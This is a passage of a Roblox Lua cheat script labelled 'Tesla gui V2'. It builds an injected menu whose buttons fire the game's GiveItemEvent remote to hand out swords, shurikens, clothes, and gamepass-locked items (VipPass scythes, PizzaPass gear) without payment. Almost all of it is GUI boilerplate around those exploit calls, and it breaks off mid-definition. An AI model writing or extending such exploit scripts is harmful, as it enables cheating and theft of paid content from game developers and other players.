GoldenYang.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
GoldenYang.BorderColor3 = Color3.fromRGB(0, 0, 0)
GoldenYang.BorderSizePixel = 0
GoldenYang.Position = UDim2.new(0.761384308, 0, 2.74276686, 0)
GoldenYang.Size = UDim2.new(0, 131, 0, 54)
GoldenYang.Font = Enum.Font.SourceSans
GoldenYang.Text = "golden yang"
GoldenYang.TextColor3 = Color3.fromRGB(255, 255, 255)
GoldenYang.TextSize = 14.000
GoldenYang.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Shuriken", "Shuriken9Yang")
end)

blackandwhite.Name = "blackandwhite"
blackandwhite.Parent = swordlabel
blackandwhite.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
blackandwhite.BorderColor3 = Color3.fromRGB(0, 0, 0)
blackandwhite.BorderSizePixel = 0
blackandwhite.Position = UDim2.new(0.48087433, 0, 1.52661073, 0)
blackandwhite.Size = UDim2.new(0, 107, 0, 54)
blackandwhite.Font = Enum.Font.SourceSans
blackandwhite.Text = "B and w sword"
blackandwhite.TextColor3 = Color3.fromRGB(255, 255, 255)
blackandwhite.TextSize = 14.000
blackandwhite.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Sword", "BlackAndWhiteWingedSword")
end)

BlackAndPurple.Name = "BlackAndPurple"
BlackAndPurple.Parent = swordlabel
BlackAndPurple.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
BlackAndPurple.BorderColor3 = Color3.fromRGB(0, 0, 0)
BlackAndPurple.BorderSizePixel = 0
BlackAndPurple.Position = UDim2.new(0.244080141, 0, 2.7427671, 0)
BlackAndPurple.Size = UDim2.new(0, 141, 0, 54)
BlackAndPurple.Font = Enum.Font.SourceSans
BlackAndPurple.Text = "black and purple yin"
BlackAndPurple.TextColor3 = Color3.fromRGB(255, 255, 255)
BlackAndPurple.TextSize = 14.000
BlackAndPurple.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Shuriken", "Shuriken9Ying")
end)

BandGreen.Name = "BandGreen"
BandGreen.Parent = swordlabel
BandGreen.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
BandGreen.BorderColor3 = Color3.fromRGB(0, 0, 0)
BandGreen.BorderSizePixel = 0
BandGreen.Position = UDim2.new(0, 0, 2.7427671, 0)
BandGreen.Size = UDim2.new(0, 134, 0, 54)
BandGreen.Font = Enum.Font.SourceSans
BandGreen.Text = "black and green yin"
BandGreen.TextColor3 = Color3.fromRGB(255, 255, 255)
BandGreen.TextSize = 14.000
BandGreen.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Shuriken", "Shuriken8Ying")

end)

aduritekatana.Name = "aduritekatana"
aduritekatana.Parent = swordlabel
aduritekatana.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
aduritekatana.BorderColor3 = Color3.fromRGB(0, 0, 0)
aduritekatana.BorderSizePixel = 0
aduritekatana.Position = UDim2.new(0, 0, 1.52661073, 0)
aduritekatana.Size = UDim2.new(0, 76, 0, 54)
aduritekatana.Font = Enum.Font.SourceSans
aduritekatana.Text = "Adurite Katana"
aduritekatana.TextColor3 = Color3.fromRGB(255, 255, 255)
aduritekatana.TextSize = 14.000
aduritekatana.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Sword", "AduriteKatana")
end)


flowerswod.Name = "flowerswod"
flowerswod.Parent = swordlabel
flowerswod.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
flowerswod.BorderColor3 = Color3.fromRGB(0, 0, 0)
flowerswod.BorderSizePixel = 0
flowerswod.Position = UDim2.new(0.828779578, 0, 1.52661073, 0)
flowerswod.Size = UDim2.new(0, 94, 0, 54)
flowerswod.Font = Enum.Font.SourceSans
flowerswod.Text = "Flower Sword"
flowerswod.TextColor3 = Color3.fromRGB(255, 255, 255)
flowerswod.TextSize = 14.000
flowerswod.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Sword", "WhiteGoldBlueFlowerSword")
end)

TextSword.Name = "TextSword"
TextSword.Parent = swordlabel
TextSword.BackgroundColor3 = Color3.fromRGB(111, 48, 138)
TextSword.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextSword.BorderSizePixel = 0
TextSword.Position = UDim2.new(0, 0, 0.443462551, 0)
TextSword.Size = UDim2.new(0, 549, 0, 25)
TextSword.Font = Enum.Font.SourceSans
TextSword.Text = "Tesla gui V2"
TextSword.TextColor3 = Color3.fromRGB(0, 0, 0)
TextSword.TextSize = 14.000

_5msword.Name = "5msword"
_5msword.Parent = swordlabel
_5msword.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
_5msword.BorderColor3 = Color3.fromRGB(0, 0, 0)
_5msword.BorderSizePixel = 0
_5msword.Position = UDim2.new(0, 0, 0.835709631, 0)
_5msword.Size = UDim2.new(0, 549, 0, 73)
_5msword.Font = Enum.Font.SourceSans
_5msword.Text = "5M+ swords"
_5msword.TextColor3 = Color3.fromRGB(167, 78, 222)
_5msword.TextSize = 14.000
_5msword.TextStrokeColor3 = Color3.fromRGB(234, 234, 234)

shuriken.Name = "shuriken"
shuriken.Parent = swordlabel
shuriken.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
shuriken.BorderColor3 = Color3.fromRGB(0, 0, 0)
shuriken.BorderSizePixel = 0
shuriken.Position = UDim2.new(0, 0, 2.04044414, 0)
shuriken.Size = UDim2.new(0, 549, 0, 74)
shuriken.Font = Enum.Font.SourceSans
shuriken.Text = "Shurikens"
shuriken.TextColor3 = Color3.fromRGB(144, 43, 207)
shuriken.TextSize = 14.000

UpdateSword.Name = "UpdateSword"
UpdateSword.Parent = swordlabel
UpdateSword.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
UpdateSword.BorderColor3 = Color3.fromRGB(0, 0, 0)
UpdateSword.BorderSizePixel = 0
UpdateSword.Position = UDim2.new(0.00546448072, 0, 3.25705385, 0)
UpdateSword.Size = UDim2.new(0, 546, 0, 184)
UpdateSword.Font = Enum.Font.SourceSans
UpdateSword.Text = ""
UpdateSword.TextColor3 = Color3.fromRGB(0, 0, 0)
UpdateSword.TextSize = 14.000

clothes.Name = "clothes"
clothes.Parent = NinjaGui
clothes.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
clothes.BorderColor3 = Color3.fromRGB(0, 0, 0)
clothes.BorderSizePixel = 0
clothes.Position = UDim2.new(0.314061493, 0, 0.206738263, 0)
clothes.Size = UDim2.new(0, 549, 0, 527)
clothes.Visible = false

ClothesLabel.Name = "ClothesLabel"
ClothesLabel.Parent = clothes
ClothesLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ClothesLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ClothesLabel.BorderSizePixel = 0
ClothesLabel.Size = UDim2.new(0, 549, 0, 105)
ClothesLabel.Image = "http://www.roblox.com/asset/?id=8129478563"

tab4cl.Name = "tab4cl"
tab4cl.Parent = ClothesLabel
tab4cl.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab4cl.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab4cl.BorderSizePixel = 0
tab4cl.Position = UDim2.new(0.517304182, 0, 0.680561185, 0)
tab4cl.Size = UDim2.new(0, 101, 0, 17)
tab4cl.Font = Enum.Font.SourceSans
tab4cl.Text = "Clothes"
tab4cl.TextColor3 = Color3.fromRGB(0, 0, 0)
tab4cl.TextSize = 14.000

tab3cl.Name = "tab3cl"
tab3cl.Parent = ClothesLabel
tab3cl.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab3cl.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab3cl.BorderSizePixel = 0
tab3cl.Position = UDim2.new(0.333333343, 0, 0.68234396, 0)
tab3cl.Size = UDim2.new(0, 101, 0, 17)
tab3cl.Font = Enum.Font.SourceSans
tab3cl.Text = "Swords"
tab3cl.TextColor3 = Color3.fromRGB(0, 0, 0)
tab3cl.TextSize = 14.000

tab2cl.Name = "tab2cl"
tab2cl.Parent = ClothesLabel
tab2cl.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab2cl.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab2cl.BorderSizePixel = 0
tab2cl.Position = UDim2.new(0.160291433, 0, 0.68234396, 0)
tab2cl.Size = UDim2.new(0, 95, 0, 17)
tab2cl.Font = Enum.Font.SourceSans
tab2cl.Text = "Combat"
tab2cl.TextColor3 = Color3.fromRGB(0, 0, 0)
tab2cl.TextSize = 14.000

tab1Cl.Name = "tab1Cl"
tab1Cl.Parent = ClothesLabel
tab1Cl.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab1Cl.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab1Cl.BorderSizePixel = 0
tab1Cl.Position = UDim2.new(0, 0, 0.682343125, 0)
tab1Cl.Size = UDim2.new(0, 88, 0, 17)
tab1Cl.Font = Enum.Font.SourceSans
tab1Cl.Text = "about"
tab1Cl.TextColor3 = Color3.fromRGB(0, 0, 0)
tab1Cl.TextSize = 14.000

tab5cl.Name = "tab5cl"
tab5cl.Parent = ClothesLabel
tab5cl.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab5cl.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab5cl.BorderSizePixel = 0
tab5cl.Position = UDim2.new(0.701275051, 0, 0.680561185, 0)
tab5cl.Size = UDim2.new(0, 101, 0, 17)
tab5cl.Font = Enum.Font.SourceSans
tab5cl.Text = "Gamepasses"
tab5cl.TextColor3 = Color3.fromRGB(0, 0, 0)
tab5cl.TextSize = 14.000

tab6cl.Name = "tab6cl"
tab6cl.Parent = ClothesLabel
tab6cl.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab6cl.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab6cl.BorderSizePixel = 0
tab6cl.Position = UDim2.new(0.885245919, 0, 0.680561185, 0)
tab6cl.Size = UDim2.new(0, 63, 0, 17)
tab6cl.Font = Enum.Font.SourceSans
tab6cl.Text = "Misc"
tab6cl.TextColor3 = Color3.fromRGB(0, 0, 0)
tab6cl.TextSize = 14.000

yin21.Name = "yin21"
yin21.Parent = ClothesLabel
yin21.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yin21.BorderColor3 = Color3.fromRGB(0, 0, 0)
yin21.BorderSizePixel = 0
yin21.Position = UDim2.new(0.872495472, 0, 1.6710943, 0)
yin21.Size = UDim2.new(0, 70, 0, 44)
yin21.Font = Enum.Font.SourceSans
yin21.Text = "yang21"
yin21.TextColor3 = Color3.fromRGB(222, 222, 222)
yin21.TextSize = 14.000
yin21.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying21")
end)

yin21_2.Name = "yin21"
yin21_2.Parent = ClothesLabel
yin21_2.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yin21_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
yin21_2.BorderSizePixel = 0
yin21_2.Position = UDim2.new(0, 0, 1.26379335, 0)
yin21_2.Size = UDim2.new(0, 76, 0, 44)
yin21_2.Font = Enum.Font.SourceSans
yin21_2.Text = "yin21"
yin21_2.TextColor3 = Color3.fromRGB(222, 222, 222)
yin21_2.TextSize = 14.000
yin21_2.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying21")
end)
yang23.Name = "yang23"
yang23.Parent = ClothesLabel
yang23.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yang23.BorderColor3 = Color3.fromRGB(0, 0, 0)
yang23.BorderSizePixel = 0
yang23.Position = UDim2.new(0.717668474, 0, 1.6710943, 0)
yang23.Size = UDim2.new(0, 85, 0, 44)
yang23.Font = Enum.Font.SourceSans
yang23.Text = "yang23"
yang23.TextColor3 = Color3.fromRGB(222, 222, 222)
yang23.TextSize = 14.000
yang23.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang23")
end)

yang26.Name = "yang26"
yang26.Parent = ClothesLabel
yang26.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yang26.BorderColor3 = Color3.fromRGB(0, 0, 0)
yang26.BorderSizePixel = 0
yang26.Position = UDim2.new(0.415300548, 0, 1.6710943, 0)
yang26.Size = UDim2.new(0, 85, 0, 44)
yang26.Font = Enum.Font.SourceSans
yang26.Text = "yang26"
yang26.TextColor3 = Color3.fromRGB(222, 222, 222)
yang26.TextSize = 14.000
yang26.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang26")
end)

yang22.Name = "yang22"
yang22.Parent = ClothesLabel
yang22.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yang22.BorderColor3 = Color3.fromRGB(0, 0, 0)
yang22.BorderSizePixel = 0
yang22.Position = UDim2.new(0.138433516, 0, 1.68061817, 0)
yang22.Size = UDim2.new(0, 76, 0, 44)
yang22.Font = Enum.Font.SourceSans
yang22.Text = "yang 22"
yang22.TextColor3 = Color3.fromRGB(222, 222, 222)
yang22.TextSize = 14.000
yang22.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang22")
end)

yang25.Name = "yang25"
yang25.Parent = ClothesLabel
yang25.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yang25.BorderColor3 = Color3.fromRGB(0, 0, 0)
yang25.BorderSizePixel = 0
yang25.Position = UDim2.new(0.570127487, 0, 1.6710943, 0)
yang25.Size = UDim2.new(0, 81, 0, 44)
yang25.Font = Enum.Font.SourceSans
yang25.Text = "yang25"
yang25.TextColor3 = Color3.fromRGB(222, 222, 222)
yang25.TextSize = 14.000
yang25.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang25")
end)
yin26.Name = "yin26"
yin26.Parent = ClothesLabel
yin26.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yin26.BorderColor3 = Color3.fromRGB(0, 0, 0)
yin26.BorderSizePixel = 0
yin26.Position = UDim2.new(0.315118402, 0, 1.26379335, 0)
yin26.Size = UDim2.new(0, 104, 0, 44)
yin26.Font = Enum.Font.SourceSans
yin26.Text = "Yin26"
yin26.TextColor3 = Color3.fromRGB(222, 222, 222)
yin26.TextSize = 14.000
yin26.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying26")
end)

yin22.Name = "yin22"
yin22.Parent = ClothesLabel
yin22.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yin22.BorderColor3 = Color3.fromRGB(0, 0, 0)
yin22.BorderSizePixel = 0
yin22.Position = UDim2.new(0.673952639, 0, 1.26379335, 0)
yin22.Size = UDim2.new(0, 100, 0, 44)
yin22.Font = Enum.Font.SourceSans
yin22.Text = "yin22"
yin22.TextColor3 = Color3.fromRGB(222, 222, 222)
yin22.TextSize = 14.000
yin22.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying22")
end)

yangrainbown.Name = "yangrainbown"
yangrainbown.Parent = ClothesLabel
yangrainbown.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yangrainbown.BorderColor3 = Color3.fromRGB(0, 0, 0)
yangrainbown.BorderSizePixel = 0
yangrainbown.Position = UDim2.new(0, 0, 1.68061817, 0)
yangrainbown.Size = UDim2.new(0, 76, 0, 44)
yangrainbown.Font = Enum.Font.SourceSans
yangrainbown.Text = "yang rainbow"
yangrainbown.TextColor3 = Color3.fromRGB(222, 222, 222)
yangrainbown.TextSize = 14.000
yangrainbown.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang20")
end)

yang24.Name = "yang24"
yang24.Parent = ClothesLabel
yang24.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yang24.BorderColor3 = Color3.fromRGB(0, 0, 0)
yang24.BorderSizePixel = 0
yang24.Position = UDim2.new(0.276867032, 0, 1.68061817, 0)
yang24.Size = UDim2.new(0, 76, 0, 44)
yang24.Font = Enum.Font.SourceSans
yang24.Text = "yang24"
yang24.TextColor3 = Color3.fromRGB(222, 222, 222)
yang24.TextSize = 14.000
yang24.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang24")
end)

yinrainbown.Name = "yinrainbown"
yinrainbown.Parent = ClothesLabel
yinrainbown.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yinrainbown.BorderColor3 = Color3.fromRGB(0, 0, 0)
yinrainbown.BorderSizePixel = 0
yinrainbown.Position = UDim2.new(0.85610199, 0, 1.26379335, 0)
yinrainbown.Size = UDim2.new(0, 79, 0, 44)
yinrainbown.Font = Enum.Font.SourceSans
yinrainbown.Text = "yin rainbow"
yinrainbown.TextColor3 = Color3.fromRGB(222, 222, 222)
yinrainbown.TextSize = 14.000
yinrainbown.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying20")
end)

yin23.Name = "yin23"
yin23.Parent = ClothesLabel
yin23.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yin23.BorderColor3 = Color3.fromRGB(0, 0, 0)
yin23.BorderSizePixel = 0
yin23.Position = UDim2.new(0.138433516, 0, 1.26379335, 0)
yin23.Size = UDim2.new(0, 97, 0, 44)
yin23.Font = Enum.Font.SourceSans
yin23.Text = "yin23"
yin23.TextColor3 = Color3.fromRGB(222, 222, 222)
yin23.TextSize = 14.000
yin23.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying23")
end)
yin24.Name = "yin24"
yin24.Parent = ClothesLabel
yin24.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
yin24.BorderColor3 = Color3.fromRGB(0, 0, 0)
yin24.BorderSizePixel = 0
yin24.Position = UDim2.new(0.504553735, 0, 1.2542696, 0)
yin24.Size = UDim2.new(0, 93, 0, 44)
yin24.Font = Enum.Font.SourceSans
yin24.Text = "yin24"
yin24.TextColor3 = Color3.fromRGB(222, 222, 222)
yin24.TextSize = 14.000
yin24.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying24")
end)
_1mclothes.Name = "1mclothes"
_1mclothes.Parent = ClothesLabel
_1mclothes.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
_1mclothes.BorderColor3 = Color3.fromRGB(0, 0, 0)
_1mclothes.BorderSizePixel = 0
_1mclothes.Position = UDim2.new(0, 0, 0.853923082, 0)
_1mclothes.Size = UDim2.new(0, 549, 0, 45)
_1mclothes.Font = Enum.Font.SourceSans
_1mclothes.Text = "1.700m+ clothes"
_1mclothes.TextColor3 = Color3.fromRGB(255, 21, 216)
_1mclothes.TextSize = 14.000

ClothesProgress.Name = "ClothesProgress"
ClothesProgress.Parent = ClothesLabel
ClothesProgress.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
ClothesProgress.BorderColor3 = Color3.fromRGB(0, 0, 0)
ClothesProgress.BorderSizePixel = 0
ClothesProgress.Position = UDim2.new(0, 0, 2.08310843, 0)
ClothesProgress.Size = UDim2.new(0, 549, 0, 307)
ClothesProgress.Font = Enum.Font.SourceSans
ClothesProgress.Text = ""
ClothesProgress.TextColor3 = Color3.fromRGB(0, 0, 0)
ClothesProgress.TextSize = 14.000

TextClothes.Name = "TextClothes"
TextClothes.Parent = ClothesLabel
TextClothes.BackgroundColor3 = Color3.fromRGB(111, 48, 138)
TextClothes.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextClothes.BorderSizePixel = 0
TextClothes.Position = UDim2.new(0, 0, 0.443462551, 0)
TextClothes.Size = UDim2.new(0, 549, 0, 25)
TextClothes.Font = Enum.Font.SourceSans
TextClothes.Text = "Tesla gui V2"
TextClothes.TextColor3 = Color3.fromRGB(0, 0, 0)
TextClothes.TextSize = 14.000

Gamepasses.Name = "Gamepasses"
Gamepasses.Parent = NinjaGui
Gamepasses.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Gamepasses.BorderColor3 = Color3.fromRGB(0, 0, 0)
Gamepasses.BorderSizePixel = 0
Gamepasses.Position = UDim2.new(0.314061493, 0, 0.206738263, 0)
Gamepasses.Size = UDim2.new(0, 549, 0, 527)
Gamepasses.Visible = false

GamepassLabel.Name = "GamepassLabel"
GamepassLabel.Parent = Gamepasses
GamepassLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
GamepassLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
GamepassLabel.BorderSizePixel = 0
GamepassLabel.Size = UDim2.new(0, 549, 0, 105)
GamepassLabel.Image = "http://www.roblox.com/asset/?id=8129478563"

tab4Ga.Name = "tab4Ga"
tab4Ga.Parent = GamepassLabel
tab4Ga.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab4Ga.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab4Ga.BorderSizePixel = 0
tab4Ga.Position = UDim2.new(0.51700002, 0, 0.680999994, 0)
tab4Ga.Size = UDim2.new(0, 101, 0, 17)
tab4Ga.Font = Enum.Font.SourceSans
tab4Ga.Text = "Clothes"
tab4Ga.TextColor3 = Color3.fromRGB(0, 0, 0)
tab4Ga.TextSize = 14.000

tab3Ga.Name = "tab3Ga"
tab3Ga.Parent = GamepassLabel
tab3Ga.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab3Ga.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab3Ga.BorderSizePixel = 0
tab3Ga.Position = UDim2.new(0.333000004, 0, 0.681999981, 0)
tab3Ga.Size = UDim2.new(0, 101, 0, 17)
tab3Ga.Font = Enum.Font.SourceSans
tab3Ga.Text = "Swords"
tab3Ga.TextColor3 = Color3.fromRGB(0, 0, 0)
tab3Ga.TextSize = 14.000

tab2Ga.Name = "tab2Ga"
tab2Ga.Parent = GamepassLabel
tab2Ga.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab2Ga.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab2Ga.BorderSizePixel = 0
tab2Ga.Position = UDim2.new(0.159999996, 0, 0.681999981, 0)
tab2Ga.Size = UDim2.new(0, 95, 0, 17)
tab2Ga.Font = Enum.Font.SourceSans
tab2Ga.Text = "Combat"
tab2Ga.TextColor3 = Color3.fromRGB(0, 0, 0)
tab2Ga.TextSize = 14.000

tab1Ga.Name = "tab1Ga"
tab1Ga.Parent = GamepassLabel
tab1Ga.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab1Ga.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab1Ga.BorderSizePixel = 0
tab1Ga.Position = UDim2.new(0, 0, 0.681999981, 0)
tab1Ga.Size = UDim2.new(0, 88, 0, 17)
tab1Ga.Font = Enum.Font.SourceSans
tab1Ga.Text = "about"
tab1Ga.TextColor3 = Color3.fromRGB(0, 0, 0)
tab1Ga.TextSize = 14.000

tab5Ga.Name = "tab5Ga"
tab5Ga.Parent = GamepassLabel
tab5Ga.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab5Ga.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab5Ga.BorderSizePixel = 0
tab5Ga.Position = UDim2.new(0.700999975, 0, 0.680999994, 0)
tab5Ga.Size = UDim2.new(0, 101, 0, 17)
tab5Ga.Font = Enum.Font.SourceSans
tab5Ga.Text = "Gamepasses"
tab5Ga.TextColor3 = Color3.fromRGB(0, 0, 0)
tab5Ga.TextSize = 14.000

tab6Ga.Name = "tab6Ga"
tab6Ga.Parent = GamepassLabel
tab6Ga.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab6Ga.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab6Ga.BorderSizePixel = 0
tab6Ga.Position = UDim2.new(0.88499999, 0, 0.680999994, 0)
tab6Ga.Size = UDim2.new(0, 63, 0, 17)
tab6Ga.Font = Enum.Font.SourceSans
tab6Ga.Text = "Misc"
tab6Ga.TextColor3 = Color3.fromRGB(0, 0, 0)
tab6Ga.TextSize = 14.000

Gamepass4.Name = "Gamepass4"
Gamepass4.Parent = GamepassLabel
Gamepass4.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Gamepass4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Gamepass4.BorderSizePixel = 0
Gamepass4.Position = UDim2.new(0, 0, 1.95089924, 0)
Gamepass4.Size = UDim2.new(0, 82, 0, 46)
Gamepass4.Font = Enum.Font.SourceSans
Gamepass4.Text = "Scythe1"
Gamepass4.TextColor3 = Color3.fromRGB(255, 248, 37)
Gamepass4.TextSize = 14.000
Gamepass4.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("VipPass", "GrimAxe")
end)

Gamepass1.Name = "Gamepass1"
Gamepass1.Parent = GamepassLabel
Gamepass1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Gamepass1.BorderColor3 = Color3.fromRGB(0, 0, 0)
Gamepass1.BorderSizePixel = 0
Gamepass1.Position = UDim2.new(0.602914393, 0, 1.95089924, 0)
Gamepass1.Size = UDim2.new(0, 105, 0, 46)
Gamepass1.Font = Enum.Font.SourceSans
Gamepass1.Text = "Scyte4"
Gamepass1.TextColor3 = Color3.fromRGB(255, 248, 37)
Gamepass1.TextSize = 14.000
Gamepass1.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("VipPass", "BoneScythe")
end)

Gamepass2.Name = "Gamepass2"
Gamepass2.Parent = GamepassLabel
Gamepass2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Gamepass2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Gamepass2.BorderSizePixel = 0
Gamepass2.Position = UDim2.new(0.794171214, 0, 1.95089924, 0)
Gamepass2.Size = UDim2.new(0, 113, 0, 46)
Gamepass2.Font = Enum.Font.SourceSans
Gamepass2.Text = "scythe2"
Gamepass2.TextColor3 = Color3.fromRGB(255, 248, 37)
Gamepass2.TextSize = 14.000
Gamepass2.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("VipPass", "ScytheOfSingularity")
end)

Gamepass3.Name = "Gamepass3"
Gamepass3.Parent = GamepassLabel
Gamepass3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Gamepass3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Gamepass3.BorderSizePixel = 0
Gamepass3.Position = UDim2.new(0.149362475, 0, 1.95089924, 0)
Gamepass3.Size = UDim2.new(0, 86, 0, 46)
Gamepass3.Font = Enum.Font.SourceSans
Gamepass3.Text = "Scyte3"
Gamepass3.TextColor3 = Color3.fromRGB(255, 248, 37)
Gamepass3.TextSize = 14.000
Gamepass3.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("VipPass", "BatWingScythe")
end)

PizzaShuriken.Name = "Pizza Shuriken"
PizzaShuriken.Parent = GamepassLabel
PizzaShuriken.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
PizzaShuriken.BorderColor3 = Color3.fromRGB(0, 0, 0)
PizzaShuriken.BorderSizePixel = 0
PizzaShuriken.Position = UDim2.new(0.699453533, 0, 2.78454876, 0)
PizzaShuriken.Size = UDim2.new(0, 165, 0, 43)
PizzaShuriken.Font = Enum.Font.SourceSans
PizzaShuriken.Text = "Pizza Shuriken"
PizzaShuriken.TextColor3 = Color3.fromRGB(244, 57, 11)
PizzaShuriken.TextSize = 14.000
PizzaShuriken.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("PizzaPass", "PizzaKunai")
end)

PizzaCloth.Name = "PizzaCloth"
PizzaCloth.Parent = GamepassLabel
PizzaCloth.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
PizzaCloth.BorderColor3 = Color3.fromRGB(0, 0, 0)
PizzaCloth.BorderSizePixel = 0
PizzaCloth.Position = UDim2.new(0.324225873, 0, 2.78454876, 0)
PizzaCloth.Size = UDim2.new(0, 206, 0, 43)
PizzaCloth.Font = Enum.Font.SourceSans
PizzaCloth.Text = "Pizza Cloth"
PizzaCloth.TextColor3 = Color3.fromRGB(244, 57, 11)
PizzaCloth.TextSize = 14.000
PizzaCloth.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("PizzaPass", "PizzaPackCloth")
end)

PizzaSword.Name = "PizzaSword"
PizzaSword.Parent = GamepassLabel
PizzaSword.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
PizzaSword.BorderColor3 = Color3.fromRGB(0, 0, 0)
PizzaSword.BorderSizePixel = 0
PizzaSword.Position = UDim2.new(0, 0, 2.78454876, 0)
PizzaSword.Size = UDim2.new(0, 183, 0, 43)
PizzaSword.Font = Enum.Font.SourceSans
PizzaSword.Text = "Pizza Sword"
PizzaSword.TextColor3 = Color3.fromRGB(244, 57, 11)
PizzaSword.TextSize = 14.000
PizzaSword.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("PizzaPass", "PizzaSword")
end)


RainbowShuriken.Name = "RainbowShuriken"
RainbowShuriken.Parent = GamepassLabel
RainbowShuriken.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
